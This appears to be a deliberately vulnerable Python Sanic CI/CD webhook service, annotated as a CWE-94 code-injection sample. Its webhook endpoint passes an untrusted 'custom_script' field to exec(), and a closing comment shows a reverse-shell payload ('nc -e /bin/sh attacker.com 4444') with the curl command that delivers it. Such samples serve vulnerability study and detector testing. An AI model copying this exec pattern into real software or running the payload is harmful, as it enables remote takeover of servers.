import os
import sys
import sqlite3
import logging
from datetime import datetime
from sanic import Sanic
from sanic.response import json as sanic_json

# Configure logging for the Serverless CI/CD Webhook Processor
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - CICDNode - %(levelname)s - %(message)s'
)
logger = logging.getLogger("SanicCICD")

DB_FILE = "build_history.db"

app = Sanic("CICD_Webhook_Service")

def init_db():
    """Initializes the SQLite database for tracking build pipelines."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE build_logs (
            build_id INTEGER PRIMARY KEY AUTOINCREMENT,
            repo_name TEXT NOT NULL,
            commit_hash TEXT NOT NULL,
            triggered_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            status TEXT NOT NULL
        )
    ''')

    mock_builds = [
        ('auth-service', 'a1b2c3d8', 'SUCCESS'),
        ('payment-gateway', 'e4f5g6h7', 'FAILED')
    ]
    cursor.executemany('''
        INSERT INTO build_logs (repo_name, commit_hash, status)
        VALUES (?, ?, ?)
    ''', mock_builds)

    conn.commit()
    conn.close()
    logger.info("Build history database initialized.")

def record_build(repo_name: str, commit_hash: str, status: str):
    """Records the outcome of a webhook-triggered build."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO build_logs (repo_name, commit_hash, status) VALUES (?, ?, ?)",
            (repo_name, commit_hash, status)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error recording build {repo_name}: {e}")

class BuildContext:
    """Provides contextual methods and properties to the build script."""
    def __init__(self, repo: str, commit: str):
        self.repo = repo
        self.commit = commit
        self.workspace = f"/tmp/workspace/{repo}/{commit}"

def execute_custom_build_step(script_code: str, build_ctx: BuildContext) -> bool:
    """
    VULNERABLE FUNCTION: CWE-94 Improper Control of Generation of Code ('Code Injection')
    Trigger Path: Sanic HTTP POST JSON payload -> 'custom_script' field -> exec()
    """
    logger.info(f"Executing custom build script for {build_ctx.repo}...")
    
    try:
        # Vulnerability: The CI/CD engine allows developers to pass custom Python
        # scripts via the webhook payload to define dynamic pre-build steps. It 
        # uses Python's built-in exec() to execute this untrusted string as code.
        # An attacker who can forge a webhook payload (e.g., bypassing signature 
        # checks or exploiting an exposed endpoint) can inject arbitrary Python code. 
        # exec() runs this code directly, leading to full Remote Code Execution (RCE).
        
        execution_globals = {"__builtins__": __builtins__}
        execution_locals = {"ctx": build_ctx, "logger": logger}
        
        # CWE-94 occurs instantly when the untrusted string is executed
        exec(script_code, execution_globals, execution_locals)
        
        return True
    except Exception as e:
        logger.error(f"Custom build step failed during execution: {e}")
        return False

@app.route("/health", methods=["GET"])
async def health_check(request):
    """Liveness probe endpoint."""
    return sanic_json({"status": "healthy", "service": "Sanic CI/CD Node"})

@app.route("/api/v1/webhook", methods=["POST"])
async def github_webhook(request):
    """API endpoint accepting CI/CD push event payloads."""
    payload = request.json
    
    if not payload:
        return sanic_json({"error": "Missing JSON payload"}, status=400)
        
    repo = payload.get("repository")
    commit = payload.get("commit")
    custom_script = payload.get("custom_script")
    
    if not repo or not commit:
        return sanic_json({"error": "Missing 'repository' or 'commit' fields"}, status=400)
        
    logger.info(f"Received webhook event for {repo} at commit {commit}")
    
    ctx = BuildContext(repo, commit)
    
    if custom_script:
        # Pass the untrusted string directly to the vulnerable function
        success = execute_custom_build_step(custom_script, ctx)
        status = "SUCCESS" if success else "FAILED"
    else:
        logger.info("No custom script provided. Bypassing custom steps.")
        status = "SUCCESS"
        
    record_build(repo, commit, status)
    
    return sanic_json({
        "message": "Webhook processed successfully",
        "repo": repo,
        "status": status
    })

if __name__ == "__main__":
    init_db()
    
    # Example Malicious Trigger:
    # 1. Attacker crafts a JSON payload containing an OS command injection payload
    #    within the 'custom_script' parameter:
    #
    #    {
    #      "repository": "frontend-app",
    #      "commit": "8f3a1b2",
    #      "custom_script": "import os; os.system('nc -e /bin/sh attacker.com 4444')"
    #    }
    #
    # 2. Attacker submits the payload to the Sanic webhook endpoint:
    #    curl -X POST http://127.0.0.1:8000/api/v1/webhook \
    #         -H "Content-Type: application/json" \
    #         -d @payload.json
    
    logger.info("Starting Sanic Webhook Receiver on http://0.0.0.0:8000")
    app.run(host="0.0.0.0", port=8000, access_log=False)
